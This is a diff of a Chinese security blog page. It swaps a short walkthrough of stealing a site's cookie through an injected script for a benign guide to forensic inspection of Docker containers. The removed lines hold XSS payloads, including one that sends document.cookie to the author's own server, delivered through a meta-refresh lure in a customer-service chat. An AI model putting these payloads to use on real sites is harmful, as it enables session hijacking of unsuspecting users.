@@ -16,34 +16,41 @@
   <meta name="author" content="liuty">
   <meta name="keywords" content="">
   
-    <meta name="description" content="开局一人一狗一刀999：发现在主页网址上加入h2标签时，参数会在页面显示  查看网页源代码还是发现了点东西  通过审计，发现这段代码运用了混淆和压缩  这时候进行输出测试，输出v&#x3D;liuty，可以看到已经写到了js代码中，并且进行了压缩  然后尝试将alert添加到里面并进行测试： 1v&#x3D;1));alert(9)&#x2F;&#x2F;  发现可以成功写入，在主页进行测试xss漏洞 1v&#x3D;1));alert">
+    <meta name="description" content="前言我认为Docker最大的优势在与可以将整套项目封装打包起来，实现一键部署，分分钟钟搞定，极大的节省项目环境部署时间，而针对Docker容器的取证工作，主要涉及几个方面：容器的配置、运行状态、文件系统、网络通信、进程等方面 正文首先看一下Docker的文件结构，使用一种称为联合文件系统的技术来高效地管理容器的文件系统，主目录位置在&#x2F;var&#x2F;lib&#x2F;docker,其中">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一次通过组合拳拿到cookie的学习记录">
-<meta property="og:url" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:title" content="Docker取证小tip">
+<meta property="og:url" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/index.html">
 <meta property="og:site_name" content="liuty&#39;s blog">
-<meta property="og:description" content="开局一人一狗一刀999：发现在主页网址上加入h2标签时，参数会在页面显示  查看网页源代码还是发现了点东西  通过审计，发现这段代码运用了混淆和压缩  这时候进行输出测试，输出v&#x3D;liuty，可以看到已经写到了js代码中，并且进行了压缩  然后尝试将alert添加到里面并进行测试： 1v&#x3D;1));alert(9)&#x2F;&#x2F;  发现可以成功写入，在主页进行测试xss漏洞 1v&#x3D;1));alert">
+<meta property="og:description" content="前言我认为Docker最大的优势在与可以将整套项目封装打包起来，实现一键部署，分分钟钟搞定，极大的节省项目环境部署时间，而针对Docker容器的取证工作，主要涉及几个方面：容器的配置、运行状态、文件系统、网络通信、进程等方面 正文首先看一下Docker的文件结构，使用一种称为联合文件系统的技术来高效地管理容器的文件系统，主目录位置在&#x2F;var&#x2F;lib&#x2F;docker,其中">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-10.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-06.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-08.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-09.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-12.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-17.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-21.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-22.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-26.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-34.png">
-<meta property="og:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-49.png">
-<meta property="article:published_time" content="2024-03-23T16:37:42.000Z">
-<meta property="article:modified_time" content="2024-05-05T05:58:34.280Z">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-58.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-58_1.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-57.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-57_1.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-59.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-01.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-13.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-14.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-16.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-16_1.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-19.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-31.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-33.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-35.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-06.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-06_1.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-07.png">
+<meta property="og:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-13.png">
+<meta property="article:published_time" content="2024-03-20T09:26:17.000Z">
+<meta property="article:modified_time" content="2024-09-27T13:03:06.338Z">
 <meta property="article:author" content="liuty">
-<meta property="article:tag" content="总结">
+<meta property="article:tag" content="电子取证">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-10.png">
+<meta name="twitter:image" content="http://example.com/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-58.png">
   
   
   
-  <title>一次通过组合拳拿到cookie的学习记录 - liuty&#39;s blog</title>
+  <title>Docker取证小tip - liuty&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -237,7 +244,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="一次通过组合拳拿到cookie的学习记录"></span>
+            <span id="subtitle" data-typed-text="Docker取证小tip"></span>
           
         </div>
 
@@ -248,8 +255,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-24 00:37" pubdate>
-          2024年3月24日 凌晨
+        <time datetime="2024-03-20 17:26" pubdate>
+          2024年3月20日 下午
         </time>
       </span>
     
@@ -260,7 +267,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          307 字
+          669 字
         
       </span>
     
@@ -271,7 +278,7 @@
         
         
         
-          3 分钟
+          6 分钟
         
       </span>
     
@@ -316,36 +323,63 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">一次通过组合拳拿到cookie的学习记录</h1>
+            <h1 id="seo-header">Docker取证小tip</h1>
             
             
               <div class="markdown-body">
                 
-                <p>开局一人一狗一刀999：发现在主页网址上加入h2标签时，参数会在页面显示</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-10.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-10.png">
-<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>查看网页源代码还是发现了点东西</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-06.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-06.png">
-<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过审计，发现这段代码运用了混淆和压缩</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-08.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-08.png">
-<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>这时候进行输出测试，输出v&#x3D;liuty，可以看到已经写到了js代码中，并且进行了压缩</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-09.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-09.png">
-<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>然后尝试将alert添加到里面并进行测试：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-comment">;alert(9)//</span><br></code></pre></td></tr></table></figure>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-12.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-12.png">
-<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>发现可以成功写入，在主页进行测试xss漏洞</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span>=<span class="hljs-number">1</span>));alert(<span class="hljs-number">1</span>);//%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-17.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-17.png">
-<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>既然xss没问题，试试是否可以ssrf</p>
-<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/vendor/analytics.min.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;</span><span class="hljs-attr">s</span> <span class="hljs-attr">IP</span>/<span class="hljs-attr">liuty</span>`;//&#x27;&lt;/<span class="hljs-attr">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-21.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-21.png">
-<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-22.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-22.png">
-<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>成功反弹读取目录的信息，看来是有戏，然后尝试结合xss跟ssrf，打cookie，目标子域有一个后台客服咨询，既然是个交互点，进行尝试</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-26.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-26.png">
-<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; url=http://xxxxx/&lt;script+src=&#x27;/vendor/analytics.min.js&#x27;&gt;&lt;/script&gt;&lt;script+src=&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;s IP/<span class="hljs-variable">$&#123;document.cookie&#125;</span>`;//&#x27;&lt;/script&gt;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-34.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-34.png">
-<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>成功拿到cookie，一看就是JWT编码，进行解码</p>
-<img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-49.png" srcset="/img/loading.gif" lazyload class="" title="2024-03-23_23-49.png">
-<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我认为Docker最大的优势在与可以将整套项目封装打包起来，实现一键部署，分分钟钟搞定，极大的节省项目环境部署时间，而针对Docker容器的取证工作，主要涉及几个方面：容器的配置、运行状态、文件系统、网络通信、进程等方面</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先看一下Docker的文件结构，使用一种称为联合文件系统的技术来高效地管理容器的文件系统，主目录位置在&#x2F;var&#x2F;lib&#x2F;docker,其中包含了Docker镜像、容器和其他组件的数据</p>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-58.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-58.png">
+<h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>镜像存储的目录位置在&#x2F;var&#x2F;lib&#x2F;docker&#x2F;containers里面，这个目录每个容器都有一个对应的子目录，其中包括容器的日志文件、配置文件以及其他与容器相关的数据等</p>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-58_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-58_1.png">
+<h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>其他文件和目录：<br>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;swarm：如果 Docker Swarm 模式被启用，这里会存储集群相关的数据，比如证书<br>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;bundles：这个目录用于存储 Docker Swarm 模式下的服务信息<br>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;buildkit：如果启用了 BuildKit 构建功能，那么这个目录将用于存储 BuildKit 的数据<br>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;tmp：临时文件存储目录，用于存放 Docker 运行过程中产生的临时文件<br>（不再一一截图了）</p>
+<p>查看正在运行中的容易</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-57.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_15-57.png">
+<h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>查看所有容易，包括停止的</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-57_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_15-57_1.png">
+<p>根据条件筛选查询</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker <span class="hljs-keyword">ps</span> --<span class="hljs-built_in">filter</span> &lt;筛选条件&gt;<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_15-59.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_15-59.png">
+<h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>指定查看某个容器详情</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">docker inspect <span class="hljs-tag">&lt;<span class="hljs-name">container_id</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-01.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-01.png">
+<h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>指定查看某个容器的日志</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">docker logs <span class="hljs-tag">&lt;<span class="hljs-name">container_id</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-13.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-13.png">
+<h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-14.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-14.png">
+<h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>查询容器实时状态，实时显示容器资源使用情况</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">docker stats <span class="hljs-tag">&lt;<span class="hljs-name">container_id</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-16.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-16.png">
+<h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>列出所有镜像信息</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-16_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-16_1.png">
+<h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>显示磁盘使用情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker system <span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-19.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-19.png">
+<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>现场取证可以备份打包容器文件系统，后续可再使用x-ways、法证通等取证工具解析</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">docker</span> ex<span class="hljs-keyword">port</span> &lt;container_id&gt; &gt; ****.tar<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-31.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-31.png">
+<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>进入容器，可进行文件目录查看，进程查询，以及网络连接情况等操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it &lt;container_id&gt; /bin/bash 或 sh<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-33.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-33.png">
+<h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>查看文件系统更改（A: 表示新增的文件或目录。D: 表示删除的文件或目录。C: 表示修改过的文件或目录。）</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker diff <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_16-35.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_16-35.png">
+<h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>查看容器网络连接</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> &lt;container_id&gt; netstat -tuln<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-06.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_17-06.png">
+<h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>查看网络接口信息</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">docker inspect <span class="hljs-variable">&lt;container_id&gt;</span> |<span class="hljs-string"> jq &#x27;.[0].NetworkSettings&#x27;</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-06_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_17-06_1.png">
+<h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>如果没有jq 则在整个inspect输出中查找网络接口信息即可</p>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-07.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_17-07.png">
+<h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>查看容器内进程信息</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">docker exec -it <span class="hljs-symbol">&lt;container_id&gt;</span> <span class="hljs-keyword">ps</span> aux<br>docker exec -it <span class="hljs-symbol">&lt;container_id&gt;</span> <span class="hljs-keyword">ps</span> -ef<br></code></pre></td></tr></table></figure>
+<img src="/2024/03/20/Docker%E5%8F%96%E8%AF%81%E5%B0%8Ftip/2024-09-27_17-13.png" srcset="/img/loading.gif" lazyload class="" title="2024-09-27_17-13.png">
+<h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6>
                 
               </div>
             
@@ -363,7 +397,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  <a href="/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/" class="category-chain-item">数字取证</a>
   
   
 
@@ -378,7 +412,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%80%BB%E7%BB%93/" class="print-no-link">#总结</a>
+        <a href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" class="print-no-link">#电子取证</a>
       
     </div>
   
@@ -390,8 +424,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>一次通过组合拳拿到cookie的学习记录</div>
-      <div>http://example.com/2024/03/24/一次通过组合拳拿到cookie的学习记录/</div>
+      <div>Docker取证小tip</div>
+      <div>http://example.com/2024/03/20/Docker取证小tip/</div>
     </div>
     <div class="license-meta">
       
@@ -403,7 +437,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月24日</div>
+          <div>2024年3月20日</div>
         </div>
       
       
@@ -435,9 +469,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/" title="取证闲谈">
